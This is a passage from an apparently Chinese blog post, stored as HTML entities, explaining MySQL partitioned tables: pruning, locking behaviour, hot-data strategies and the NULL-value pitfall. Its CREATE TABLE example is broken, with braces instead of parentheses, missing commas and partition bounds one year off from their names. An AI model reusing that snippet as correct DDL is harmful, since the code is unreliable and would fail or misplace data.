x67E5;&#x8BE2;&#x5355;&#x8868;&#x4E00;&#x6837;&#x67E5;&#x8BE2;&#x5206;&#x8868;&#x540E;&#x7684;&#x6570;&#x636E;&#x3002;&#x5982;&#x679C;&#x518D;&#x5C06;&#x62BD;&#x8C61;&#x7684;&#x903B;&#x8F91;&#x4E0B;&#x79FB;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7684;&#x670D;&#x52A1;&#x5C42;&#xFF0C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4ECA;&#x5929;&#x8981;&#x8BB2;&#x7684;&#x5206;&#x533A;&#x8868;&#x3002;</p><p>&#x5206;&#x533A;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x4ECE;&#x6280;&#x672F;&#x5C42;&#x9762;&#x89E3;&#x51B3;&#x5927;&#x6570;&#x636E;&#x95EE;&#x9898;&#x7684;&#x6709;&#x6548;&#x65B9;&#x6CD5;&#xFF0C;&#x7B80;&#x5355;&#x7684;&#x7406;&#x89E3;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x662F; MySQL &#x5E95;&#x5C42;&#x5E2E;&#x6211;&#x4EEC;&#x5B9E;&#x73B0;&#x5206;&#x8868;&#xFF0C;&#x5206;&#x533A;&#x8868;&#x662F;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x903B;&#x8F91;&#x8868;&#xFF0C;&#x5E95;&#x5C42;&#x7531;&#x591A;&#x4E2A;&#x7269;&#x7406;&#x5B50;&#x8868;&#x7EC4;&#x6210;&#x3002;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7BA1;&#x7406;&#x5206;&#x533A;&#x7684;&#x5404;&#x4E2A;&#x5E95;&#x5C42;&#x8868;&#x548C;&#x7BA1;&#x7406;&#x666E;&#x901A;&#x8868;&#x4E00;&#x6837;&#xFF08;&#x6240;&#x6709;&#x5E95;&#x5C42;&#x8868;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF09;&#xFF0C;&#x5206;&#x533A;&#x8868;&#x7684;&#x7D22;&#x5F15;&#x4E5F;&#x662F;&#x5728;&#x5404;&#x4E2A;&#x5E95;&#x5C42;&#x8868;&#x4E0A;&#x5404;&#x81EA;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;&#x5B8C;&#x5168;&#x76F8;&#x540C;&#x7684;&#x7D22;&#x5F15;&#x3002;&#x4ECE;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x770B;&#xFF0C;&#x5E95;&#x5C42;&#x8868;&#x548C;&#x666E;&#x901A;&#x8868;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4E0D;&#x540C;&#xFF0C;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x4E5F;&#x65E0;&#x987B;&#x77E5;&#x9053;&#x3002;&#x5728;&#x6267;&#x884C;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x4F18;&#x5316;&#x5668;&#x4F1A;&#x6839;&#x636E;&#x5206;&#x533A;&#x7684;&#x5B9A;&#x4E49;&#x8FC7;&#x6EE4;&#x90A3;&#x4E9B;&#x6CA1;&#x6709;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6570;&#x636E;&#x7684;&#x5206;&#x533A;&#xFF0C;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#x5C31;&#x65E0;&#x9700;&#x626B;&#x63CF;&#x6240;&#x6709;&#x5206;&#x533A;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x67E5;&#x627E;&#x5305;&#x542B;&#x9700;&#x8981;&#x6570;&#x636E;&#x7684;&#x5206;&#x533A;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</p><p>&#x66F4;&#x597D;&#x7684;&#x7406;&#x89E3;&#x5206;&#x533A;&#x8868;&#xFF0C;&#x6211;&#x4EEC;&#x4ECE;&#x4E00;&#x4E2A;&#x793A;&#x4F8B;&#x5165;&#x624B;&#xFF1A;&#x4E00;&#x5F20;&#x8BA2;&#x5355;&#x8868;&#xFF0C;&#x6570;&#x636E;&#x91CF;&#x5927;&#x6982;&#x6709; 10TB&#xFF0C;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x624D;&#x80FD;&#x4F7F;&#x6027;&#x80FD;&#x8FBE;&#x5230;&#x6700;&#x4F18;&#xFF1F;</p><p>&#x9996;&#x5148;&#x53EF;&#x4EE5;&#x80AF;&#x5B9A;&#x7684;&#x662F;&#xFF0C;&#x56E0;&#x4E3A;&#x6570;&#x636E;&#x91CF;&#x5DE8;&#x5927;&#xFF0C;&#x80AF;&#x5B9A;&#x4E0D;&#x80FD;&#x8D70;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x8BDD;&#xFF0C;&#x4F60;&#x4F1A;&#x53D1;&#x73B0;&#x6570;&#x636E;&#x5E76;&#x4E0D;&#x662F;&#x6309;&#x7167;&#x60F3;&#x8981;&#x7684;&#x65B9;&#x5F0F;&#x805A;&#x96C6;&#xFF0C;&#x800C;&#x4E14;&#x4F1A;&#x4EA7;&#x751F;&#x5927;&#x91CF;&#x7684;&#x788E;&#x7247;&#xFF0C;&#x6700;&#x7EC8;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x4EA7;&#x751F;&#x6210;&#x5343;&#x4E0A;&#x4E07;&#x7684;&#x968F;&#x673A; I/O&#xFF0C;&#x5E94;&#x7528;&#x968F;&#x4E4B;&#x50F5;&#x6B7B;&#x3002;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x9009;&#x62E9;&#x4E00;&#x4E9B;&#x66F4;&#x7C97;&#x7C92;&#x5EA6;&#x5E76;&#x4E14;&#x6D88;&#x8017;&#x66F4;&#x5C11;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x3002;&#x6BD4;&#x5982;&#x5148;&#x6839;&#x636E;&#x7D22;&#x5F15;&#x627E;&#x5230;&#x4E00;&#x5927;&#x5757;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5728;&#x8FD9;&#x5757;&#x6570;&#x636E;&#x4E0A;&#x987A;&#x5E8F;&#x626B;&#x63CF;&#x3002;</p><p>&#x8FD9;&#x6B63;&#x662F;&#x5206;&#x533A;&#x8981;&#x505A;&#x7684;&#x4E8B;&#x60C5;&#xFF0C;&#x7406;&#x89E3;&#x5206;&#x533A;&#x65F6;&#x8FD8;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x5F53;&#x4F5C;&#x7D22;&#x5F15;&#x7684;&#x6700;&#x521D;&#x5F62;&#x6001;&#xFF0C;&#x4EE5;&#x4EE3;&#x4EF7;&#x975E;&#x5E38;&#x5C0F;&#x7684;&#x65B9;&#x5F0F;&#x5B9A;&#x4F4D;&#x5230;&#x9700;&#x8981;&#x7684;&#x6570;&#x636E;&#x5728;&#x54EA;&#x4E00;&#x7247; &#x201C;&#x533A;&#x57DF;&#x201D;&#xFF0C;&#x5728;&#x8FD9;&#x7247; &#x201C;&#x533A;&#x57DF;&#x201D; &#x4E2D;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x987A;&#x5E8F;&#x626B;&#x63CF;&#xFF0C;&#x53EF;&#x4EE5;&#x5EFA;&#x7D22;&#x5F15;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5C06;&#x6570;&#x636E;&#x90FD;&#x7F13;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x56E0;&#x4E3A;&#x5206;&#x533A;&#x65E0;&#x987B;&#x989D;&#x5916;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x8BB0;&#x5F55;&#x6BCF;&#x4E2A;&#x5206;&#x533A;&#x6709;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x5176;&#x4EE3;&#x4EF7;&#x975E;&#x5E38;&#x4F4E;&#x3002;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x8868;&#x8FBE;&#x5F0F;&#x5C31;&#x53EF;&#x4EE5;&#x8868;&#x8FBE;&#x6BCF;&#x4E2A;&#x5206;&#x533A;&#x5B58;&#x653E;&#x7684;&#x662F;&#x4EC0;&#x4E48;&#x6570;&#x636E;&#x3002;</p><p>&#x5BF9;&#x8868;&#x5206;&#x533A;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x521B;&#x5EFA;&#x8868;&#x65F6;&#xFF0C;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x8BED;&#x53E5;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE sales {</span><br><span class="line">    order_date DATETIME NOT NULL</span><br><span class="line">    -- other columns</span><br><span class="line">} ENGINE=InnoDB PARTITION BY RANGE(YEAR(order_date)) (</span><br><span class="line">    PARTITION p_2014 VALUES LESS THAN (2014),</span><br><span class="line">    PARTITION p_2015 VALUES LESS THAN (2015)</span><br><span class="line">    PARTITION p_2016 VALUES LESS THAN (2016)</span><br><span class="line">    PARTITION p_2017 VALUES LESS THAN (2017)</span><br><span class="line">    PARTITION p_catchall VALUES LESS THAN MAXVALUE</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5206;&#x533A;&#x5B50;&#x53E5;&#x4E2D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5404;&#x79CD;&#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x5FC5;&#x987B;&#x662F;&#x4E00;&#x4E2A;&#x786E;&#x5B9A;&#x7684;&#x6574;&#x6570;&#xFF0C;&#x4E14;&#x4E0D;&#x80FD;&#x662F;&#x4E00;&#x4E2A;&#x5E38;&#x6570;&#x3002;MySQL &#x8FD8;&#x652F;&#x6301;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5206;&#x533A;&#xFF0C;&#x6BD4;&#x5982;&#x952E;&#x503C;&#x3001;&#x54C8;&#x5E0C;&#x3001;&#x5217;&#x8868;&#x5206;&#x533A;&#xFF0C;&#x4F46;&#x5728;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5F88;&#x5C11;&#x89C1;&#x5230;&#x3002;&#x5728; MySQL5.5 &#x4EE5;&#x540E;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; RANGE COLUMNS &#x7C7B;&#x578B;&#x5206;&#x533A;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x4F7F;&#x662F;&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x5206;&#x533A;&#xFF0C;&#x4E5F;&#x65E0;&#x9700;&#x518D;&#x5C06;&#x5176;&#x8F6C;&#x5316;&#x6210;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x3002;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x7B80;&#x5355;&#x770B;&#x4E0B;&#x5206;&#x533A;&#x8868;&#x4E0A;&#x7684;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#x903B;&#x8F91;&#xFF1A;</p><ul><li><code>SELECT</code>&#xFF1A;&#x5F53;&#x67E5;&#x8BE2;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x8868;&#x65F6;&#xFF0C;&#x5206;&#x533A;&#x5C42;<strong>&#x5148;&#x6253;&#x5F00;&#x5E76;&#x9501;&#x4F4F;&#x6240;&#x6709;&#x7684;&#x5E95;&#x5C42;&#x8868;</strong>&#xFF0C;&#x4F18;&#x5316;&#x5668;&#x5148;&#x5224;&#x65AD;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x8FC7;&#x6EE4;&#x90E8;&#x5206;&#x5206;&#x533A;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x8C03;&#x7528;&#x5BF9;&#x5E94;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x63A5;&#x53E3;&#x8BBF;&#x95EE;&#x5404;&#x4E2A;&#x5206;&#x533A;&#x7684;&#x6570;&#x636E;</li><li><code>INSERT</code>&#xFF1A;&#x5F53;&#x63D2;&#x5165;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x65F6;&#xFF0C;&#x5206;&#x533A;&#x5C42;<strong>&#x5148;&#x6253;&#x5F00;&#x5E76;&#x9501;&#x4F4F;&#x6240;&#x6709;&#x7684;&#x5E95;&#x5C42;&#x8868;</strong>&#xFF0C;&#x7136;&#x540E;&#x786E;&#x5B9A;&#x54EA;&#x4E2A;&#x5206;&#x533A;&#x63A5;&#x6536;&#x8FD9;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x518D;&#x5C06;&#x8BB0;&#x5F55;&#x5199;&#x5165;&#x5BF9;&#x5E94;&#x7684;&#x5E95;&#x5C42;&#x8868;&#xFF0C;DELETE&#x64CD;&#x4F5C;&#x4E0E;&#x5176;&#x7C7B;&#x4F3C;</li><li><code>UPDATE</code>&#xFF1A;&#x5F53;&#x66F4;&#x65B0;&#x4E00;&#x6761;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5206;&#x533A;&#x5C42;<strong>&#x5148;&#x6253;&#x5F00;&#x5E76;&#x9501;&#x4F4F;&#x6240;&#x6709;&#x7684;&#x5E95;&#x5C42;&#x8868;</strong>&#xFF0C;&#x7136;&#x540E;&#x786E;&#x5B9A;&#x6570;&#x636E;&#x5BF9;&#x5E94;&#x7684;&#x5206;&#x533A;&#xFF0C;&#x7136;&#x540E;&#x53D6;&#x51FA;&#x6570;&#x636E;&#x5E76;&#x66F4;&#x65B0;&#xFF0C;&#x518D;&#x5224;&#x65AD;&#x66F4;&#x65B0;&#x540E;&#x7684;&#x6570;&#x636E;&#x5E94;&#x8BE5;&#x5B58;&#x653E;&#x5230;&#x54EA;&#x4E2A;&#x5206;&#x533A;&#xFF0C;&#x6700;&#x540E;&#x5BF9;&#x5E95;&#x5C42;&#x8868;&#x8FDB;&#x884C;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5BF9;&#x539F;&#x6570;&#x636E;&#x6240;&#x5728;&#x7684;&#x5E95;&#x5C42;&#x8868;&#x8FDB;&#x884C;&#x5220;&#x9664;&#x64CD;&#x4F5C;</li></ul><p>&#x6709;&#x4E9B;&#x64CD;&#x4F5C;&#x662F;&#x652F;&#x6301;&#x6761;&#x4EF6;&#x8FC7;&#x6EE4;&#x7684;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5F53;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x65F6;&#xFF0C;MySQL &#x9700;&#x8981;&#x5148;&#x627E;&#x5230;&#x8FD9;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x5982;&#x679C;WHERE&#x6761;&#x4EF6;&#x6070;&#x597D;&#x548C;&#x5206;&#x533A;&#x8868;&#x8FBE;&#x5F0F;&#x5339;&#x914D;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5C06;&#x6240;&#x6709;&#x4E0D;&#x5305;&#x542B;&#x8FD9;&#x6761;&#x8BB0;&#x5F55;&#x7684;&#x5206;&#x533A;&#x90FD;&#x8FC7;&#x6EE4;&#x6389;&#xFF0C;&#x8FD9;&#x5BF9;UPDATE&#x8BED;&#x53E5;&#x540C;&#x6837;&#x6709;&#x6548;&#x3002;&#x5982;&#x679C;&#x662F;INSERT&#x64CD;&#x4F5C;&#xFF0C;&#x672C;&#x8EAB;&#x5C31;&#x53EA;&#x547D;&#x4E2D;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#xFF0C;&#x5176;&#x4ED6;&#x5206;&#x533A;&#x90FD;&#x4F1A;&#x88AB;&#x8FC7;&#x6EE4;&#x3002;</p><p>&#x867D;&#x7136;&#x6BCF;&#x4E2A;&#x64CD;&#x4F5C;&#x90FD;&#x4F1A; &#x201C;&#x5148;&#x6253;&#x5F00;&#x5E76;&#x9501;&#x4F4F;&#x6240;&#x6709;&#x7684;&#x5E95;&#x5C42;&#x8868;&#x201D;&#xFF0C;&#x4F46;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x8BF4;&#x5206;&#x533A;&#x8868;&#x5728;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x4E2D;&#x662F;&#x9501;&#x4F4F;&#x5168;&#x8868;&#x7684;&#x3002;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x80FD;&#x591F;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x884C;&#x7EA7;&#x9501;&#xFF0C;&#x4F8B;&#x5982; InnoDB&#xFF0C;&#x5219;&#x4F1A;&#x5728;&#x5206;&#x533A;&#x5C42;&#x91CA;&#x653E;&#x5BF9;&#x5E94;&#x8868;&#x9501;&#x3002;&#x8FD9;&#x4E2A;&#x52A0;&#x9501;&#x548C;&#x89E3;&#x9501;&#x7684;&#x64CD;&#x4F5C;&#x8FC7;&#x7A0B;&#x4E0E;&#x666E;&#x901A; InnoDB &#x4E0A;&#x7684;&#x67E5;&#x8BE2;&#x7C7B;&#x4F3C;&#x3002;</p><p>&#x5728;&#x4F7F;&#x7528;&#x5206;&#x533A;&#x8868;&#x65F6;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x5927;&#x6570;&#x636E;&#x91CF;&#x7684;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x4E00;&#x822C;&#x6709;&#x4E24;&#x4E2A;&#x7B56;&#x7565;&#xFF1A;</p><ul><li>&#x5168;&#x91CF;&#x626B;&#x63CF;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x7528;&#x7D22;&#x5F15;&#x3002;&#x5373;&#x53EA;&#x8981;&#x80FD;&#x591F;&#x6839;&#x636E; WHERE &#x6761;&#x4EF6;&#x5C06;&#x9700;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x9650;&#x5236;&#x5728;&#x5C11;&#x6570;&#x5206;&#x533A;&#x4E2D;&#xFF0C;&#x6548;&#x7387;&#x662F;&#x4E0D;&#x9519;&#x7684;</li><li>&#x7D22;&#x5F15;&#x6570;&#x636E;&#xFF0C;&#x5206;&#x79BB;&#x70ED;&#x70B9;&#x3002;&#x5982;&#x679C;&#x6570;&#x636E;&#x6709;&#x660E;&#x663E;&#x7684; &#x201C;&#x70ED;&#x70B9;&#x201D;&#xFF0C;&#x800C;&#x4E14;&#x9664;&#x4E86;&#x8FD9;&#x90E8;&#x5206;&#x6570;&#x636E;&#xFF0C;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5F88;&#x5C11;&#x88AB;&#x8BBF;&#x95EE;&#x5230;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x90E8;&#x5206;&#x70ED;&#x70B9;&#x6570;&#x636E;&#x5355;&#x72EC;&#x5B58;&#x653E;&#x5728;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x4E2D;&#xFF0C;&#x8BA9;&#x8FD9;&#x4E2A;&#x5206;&#x533A;&#x7684;&#x6570;&#x636E;&#x80FD;&#x591F;&#x6709;&#x673A;&#x4F1A;&#x90FD;&#x7F13;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x8FD9;&#x6837;&#x67E5;&#x8BE2;&#x5C31;&#x53EF;&#x4EE5;&#x53EA;&#x8BBF;&#x95EE;&#x4E00;&#x4E2A;&#x5F88;&#x5C0F;&#x7684;&#x5206;&#x533A;&#x8868;&#xFF0C;&#x80FD;&#x591F;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#xFF0C;&#x4E5F;&#x80FD;&#x591F;&#x6709;&#x6548;&#x7684;&#x5229;&#x7528;&#x7F13;&#x5B58;&#x3002;</li></ul><p>&#x5206;&#x533A;&#x8868;&#x7684;&#x4F18;&#x70B9;&#x662F;&#x4F18;&#x5316;&#x5668;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x5206;&#x533A;&#x51FD;&#x6570;&#x6765;&#x8FC7;&#x6EE4;&#x4E00;&#x4E9B;&#x5206;&#x533A;&#xFF0C;&#x4F46;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x70B9;&#x662F;&#x8981;&#x5728;WHERE&#x6761;&#x4EF6;&#x4E2D;&#x5E26;&#x5165;&#x5206;&#x533A;&#x5217;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x5373;&#x4F7F;&#x770B;&#x4F3C;&#x591A;&#x4F59;&#x7684;&#x4E5F;&#x8981;&#x5E26;&#x4E0A;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x8BA9;&#x4F18;&#x5316;&#x5668;&#x80FD;&#x591F;&#x8FC7;&#x6EE4;&#x6389;&#x65E0;&#x987B;&#x8BBF;&#x95EE;&#x7684;&#x5206;&#x533A;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8FD9;&#x4E9B;&#x6761;&#x4EF6;&#xFF0C;MySQL &#x5C31;&#x9700;&#x8981;&#x8BA9;&#x5BF9;&#x5E94;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x8BBF;&#x95EE;&#x8FD9;&#x4E2A;&#x8868;&#x7684;&#x6240;&#x6709;&#x5206;&#x533A;&#xFF0C;&#x5982;&#x679C;&#x8868;&#x975E;&#x5E38;&#x5927;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x4F1A;&#x975E;&#x5E38;&#x6162;&#x3002;</p><p>&#x4E0A;&#x9762;&#x4E24;&#x4E2A;&#x5206;&#x533A;&#x7B56;&#x7565;&#x57FA;&#x4E8E;&#x4E24;&#x4E2A;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x524D;&#x63D0;&#xFF1A;&#x67E5;&#x8BE2;&#x90FD;&#x80FD;&#x591F;&#x8FC7;&#x6EE4;&#x6389;&#x5F88;&#x591A;&#x989D;&#x5916;&#x7684;&#x5206;&#x533A;&#xFF0C;&#x5206;&#x533A;&#x672C;&#x8EAB;&#x5E76;&#x4E0D;&#x4F1A;&#x5E26;&#x6765;&#x5F88;&#x591A;&#x989D;&#x5916;&#x7684;&#x4EE3;&#x4EF7;&#x3002;&#x800C;&#x8FD9;&#x4E24;&#x4E2A;&#x524D;&#x63D0;&#x5728;&#x67D0;&#x4E9B;&#x573A;&#x666F;&#x4E0B;&#x662F;&#x6709;&#x95EE;&#x9898;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p><p><strong>1&#x3001;NULL &#x503C;&#x4F1A;&#x4F7F;&#x5206;&#x533A;&#x8FC7;&#x6EE4;&#x65E0;&#x6548;</strong></p><p>&#x5047;&#x8BBE;&#x6309;&#x7167;<code>PARTITION BY RANGE YEAR(order_date)</code>&#x5206;&#x533A;&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x6709;<code>order_date</code>&#x4E3A; <code>NULL</code> &#x6216;&#x8005;&#x975E;&#x6CD5;&#x503C;&#x65F6;&#xFF0C;&#x8BB0;&#x5F55;&#x90FD;&#x4F1A;&#x88AB;&#x5B58;&#x653E;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x3002;&#x6240;&#x4EE5;<code>WHERE order_date BETWEEN &apos;2017-05-01&apos; AND &apos;2017-05-31&apos;</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x4F1A;&#x68C0;&#x67E5;&#x4E24;&#x4E2A;&#x5206;&#x533A;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6211;&#x4EEC;&#x8BA4;&#x4E3A;&#x7684; 2017 &#x5E74;&#x8FD9;&#x4E2A;&#x5206;&#x533A;&#xFF08;&#x4F1A;&#x989D;&#x5916;&#x7684;&#x68C0;&#x67E5;&#x7B2C;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#xFF09;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;YEAR()&#x5728;&#x63A5;&#x6536;&#x975E;&#x6CD5;&#x503C;&#x65F6;&#x4F1A;&#x8FD4;&#x56DE; <code>NULL</code>&#x3002;&#x5982;&#x679C;&#x7B2C;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x7684;&#x6570;&#x636E;&#x91CF;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x4F7F;&#x7528;&#x5168;&#x8868;&#x626B;&#x63CF;&#x7684;&#x7B56;&#x7565;&#x65F6;&#xFF0C;&#x4EE3;&#x4EF7;&#x4F1A;&#x975E;&#x5E38;&#x5927;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65E0;&#x7528;&#x7684;&#x5206;&#x533A;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;<code>PARTITION p_null values less than (0)</code>&#x3002;&#x5982;&#x679C;&#x63D2;&#x5165;&#x7684;&#x6570;&#x636E;&#x90FD;&#x662F;&#x6709;&#x6548;&#x7684;&#x8BDD;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x5C31;&#x662F;&#x7A7A;&#x7684;&#x3002;</p><blockquote><p>&#x5728; MySQL5.5 &#x4EE5;&#x540E;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x8FD9;&#x4E2A;&#x6280;&#x5DE7;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x5217;&#x672C;&#x8EAB;&#x800C;&#x4E0D;&#x662F;&#x57FA;&#x4E8E;&#x5217;&#x7684;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5206;&#x533A;&#xFF1A;PARTITION BY RANGE COLUMNS(order_date)&#x3002;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x8BED;&#x6CD5;&#x53EF;&#x907F;&#x514D;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;</p></blockquote><p><strong>2&#x3001;&#x5206;&#x533A;&#x5217;&#x548C;&#x7D22;&#x5F15;&#x5217;&#x4E0D;&#x5339;&#x914D;</strong></p><p>&#x5F53;&#x5206;&#x533A;&#x5217;&#x548C;&#x7D22;&#x5F15;&#x5217;&#x4E0D;&#x5339;&#x914D;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x67E5;&#x8BE2;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;&#x5206;&#x533A;&#x8FC7;&#x6EE4;&#xFF0C;&#x9664;&#x975E;&#x6BCF;&#x4E2A;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x4E2D;&#x90FD;&#x5305;&#x542B;&#x5206;&#x533A;&#x5217;&#x3002;&#x5047;&#x8BBE;&#x5728;&#x5217; a &#x4E0A;&#x5B9A;&#x4E49;&#x4E86;&#x7D22;&#x5F15;&#xFF0C;&#x800C;&#x5728;&#x5217; b &#x4E0A;&#x8FDB;&#x884C;&#x5206;&#x533A;&#x3002;&#x56E0;&#x4E3A;&#x6BCF;&#x4E2A;&#x5206;&#x533A;&#x90FD;&#x6709;&#x5176;&#x72EC;&#x7ACB;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x626B;&#x63CF;&#x5217; b &#x4E0A;&#x7684;&#x7D22;&#x5F15;&#x5C31;&#x9700;&#x8981;&#x626B;&#x63CF;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x5185;&#x5BF9;&#x5E94;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x5F53;&#x7136;&#x8FD9;&#x79CD;&#x901F;&#x5EA6;&#x4E0D;&#x4F1A;&#x592A;&#x6162;&#xFF0C;&#x4F46;&#x662F;&#x80FD;&#x591F;&#x8DF3;&#x8FC7;&#x4E0D;&#x5339;&#x914D;&#x7684;&#x5206;&#x533A;&#x80AF;&#x5B9A;&#x4F1A;&#x66F4;&#x597D;&#x3002;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x770B;&#x8D77;&#x6765;&#x5F88;&#x5BB9;&#x6613;&#x907F;&#x514D;&#xFF0C;&#x4F46;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x5C31;&#x662F;&#xFF0C;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x3002;&#x5982;&#x679C;&#x5206;&#x533A;&#x8868;&#x662F;&#x5173;&#x8054;&#x987A;&#x5E8F;&#x7684;&#x7B2C; 2 